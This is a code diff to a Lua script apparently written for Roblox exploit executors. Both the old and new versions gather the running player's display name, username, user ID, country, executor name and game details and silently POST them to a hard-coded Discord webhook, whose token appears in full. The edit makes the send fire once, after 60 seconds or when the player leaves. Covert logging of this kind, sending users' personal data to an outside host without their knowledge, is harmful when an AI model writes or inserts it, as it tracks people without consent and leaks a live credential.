@@ -1,35 +1,51 @@
-local executor = identifyexecutor()
+local Logged = false
 local Player = game:GetService("Players").LocalPlayer
-local Country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(Player)
 
-local url = "https://discord.com/api/webhooks/1309764426026717235/ZuqXJVQ04gIlVtUjthV5MHW3tOcxnUuZdUBj8Lcn_wzjH75OkEDz01TsqbZIcXFEDi2x"
-local data = {
-    ["embeds"] = {
-        {
-            ["color"] = 16711680,
-            ["fields"] = {
+function log()
+    if Logged == false then
+        Logged = true
+        local executor = identifyexecutor()
+        local Country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(Player)
+        
+        local url = "https://discord.com/api/webhooks/1309764426026717235/ZuqXJVQ04gIlVtUjthV5MHW3tOcxnUuZdUBj8Lcn_wzjH75OkEDz01TsqbZIcXFEDi2x"
+        local data = {
+            ["embeds"] = {
                 {
-                    ["name"] = "User Logged",
-                    ["value"] = "**DisplayName**: "..Player.DisplayName.."\n**User:** ["..Player.Name.."](https://www.roblox.com/users/"..Player.UserId.."/profile)\n**Executor:** "..executor.."\n**Country**: "..Country.."\n\n"..os.date("**Executed** on: %x %X%p")
-                },
-                {
-                    ["name"] = "**Game Information:**",
-                    ["value"] = "**Name:** "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n**GameId:** ".. game.GameId.."\n**PlaceId:** "..game.PlaceId
-                },
-            },
-            ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=420&height=420&format=png"
+                    ["color"] = 16711680,
+                    ["fields"] = {
+                        {
+                            ["name"] = "User Logged",
+                            ["value"] = "**DisplayName**: "..Player.DisplayName.."\n**User:** ["..Player.Name.."](https://www.roblox.com/users/"..Player.UserId.."/profile)\n**Executor:** "..executor.."\n**Country**: "..Country.."\n\n"..os.date("**Executed** on: %x %X%p")
+                        },
+                        {
+                            ["name"] = "**Game Information:**",
+                            ["value"] = "**Name:** "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n**GameId:** ".. game.GameId.."\n**PlaceId:** "..game.PlaceId
+                        },
+                    },
+                    ["thumbnail"] = {
+                        ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=420&height=420&format=png"
+                    }
+                }
             }
         }
-    }
-}
+        
+        
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+        
+        local headers = {
+           ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(abcdef)
+    end
+end
 
+game:GetService("Players").PlayerRemoving:Connect(function(PlayerRemoving)
+    if PlayerRemoving.Name == Player.Name then
+        log()
+    end
+end)
 
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+wait(60)
+log()
